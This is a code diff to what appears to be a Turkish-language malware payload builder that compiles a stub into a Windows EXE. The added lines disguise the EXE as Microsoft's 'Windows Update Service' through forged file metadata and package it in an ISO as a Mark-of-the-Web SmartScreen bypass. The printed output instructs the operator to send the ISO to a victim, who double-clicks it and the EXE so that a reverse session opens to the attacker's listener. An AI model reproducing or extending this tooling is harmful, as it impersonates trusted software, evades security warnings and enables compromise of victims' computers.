@@ -386,6 +386,11 @@ _r()
              "--output-filename=" + exe_name + ".exe",
              "--remove-output",
              "--assume-yes-for-downloads",
+             "--windows-company-name=Microsoft Corporation",
+             "--windows-product-name=Windows Update Service",
+             "--windows-file-version=10.0.26200.1",
+             "--windows-product-version=10.0.26200.1",
+             "--windows-file-description=Windows Update Assistant",
              stub_path],
             capture_output=True, text=True
         )
@@ -405,17 +410,35 @@ _r()
                     pass
 
         if os.path.exists(exe_out):
+            # ISO paketleme — SmartScreen MOTW bypass
+            iso_out = os.path.join(output_dir, exe_name + ".iso")
+            try:
+                import pycdlib
+                iso = pycdlib.PyCdlib()
+                iso.new(interchange_level=3, joliet=3, vol_ident='UPDATE')
+                iso.add_file(exe_out,
+                             iso_path='/' + exe_name.upper()[:8] + '.EXE;1',
+                             joliet_path='/' + exe_name + '.exe')
+                iso.write(iso_out)
+                iso.close()
+            except Exception as e:
+                iso_out = None
+
             exe_size = os.path.getsize(exe_out) / (1024*1024)
             print(f"\n{C.GREEN}{C.BOLD}  ╔══════════════════════════════════════════════════════╗{C.RESET}")
             print(f"{C.GREEN}{C.BOLD}  ║  ✅ TEK DOSYA EXE PAYLOAD HAZIR!                     ║{C.RESET}")
             print(f"{C.GREEN}{C.BOLD}  ╚══════════════════════════════════════════════════════╝{C.RESET}")
-            print(f"\n{C.WHITE}  📁 Dosya   : {os.path.abspath(exe_out)}{C.RESET}")
+            print(f"\n{C.WHITE}  📁 EXE     : {os.path.abspath(exe_out)}{C.RESET}")
+            if iso_out and os.path.exists(iso_out):
+                iso_size = os.path.getsize(iso_out) / (1024*1024)
+                print(f"{C.WHITE}  💿 ISO     : {os.path.abspath(iso_out)} ({iso_size:.1f} MB){C.RESET}")
+                print(f"{C.WHITE}  🛡️  MOTW    : ISO ile SmartScreen bypass ✅{C.RESET}")
             print(f"{C.WHITE}  📦 Boyut   : {exe_size:.1f} MB{C.RESET}")
             print(f"{C.WHITE}  🛡️  Anti-SB : {'Açık' if anti_sb else 'Kapalı (Test Modu)'}{C.RESET}")
             print(f"{C.WHITE}  🎯 Hedef   : {lhost}:{lport}{C.RESET}")
             print(f"{C.WHITE}  🔧 Derleyici: Nuitka (Native C){C.RESET}")
-            print(f"\n{C.YELLOW}  [!] Bu EXE'yi hedefe gönderip çift tıklatmanız yeterli.{C.RESET}")
-            print(f"{C.YELLOW}  [!] Pencere açılmaz, arka planda sessizce çalışır.{C.RESET}")
+            print(f"\n{C.YELLOW}  [!] ISO dosyasını hedefe gönderin — SmartScreen uyarısı çıkmaz!{C.RESET}")
+            print(f"{C.YELLOW}  [!] Hedef ISO'ya çift tıklar → EXE'ye çift tıklar → Session gelir{C.RESET}")
             print(f"{C.YELLOW}  [!] Listener'ınızı başlatmayı unutmayın: Menüden 2) Listener{C.RESET}")
 
             # Klasörü otomatik aç
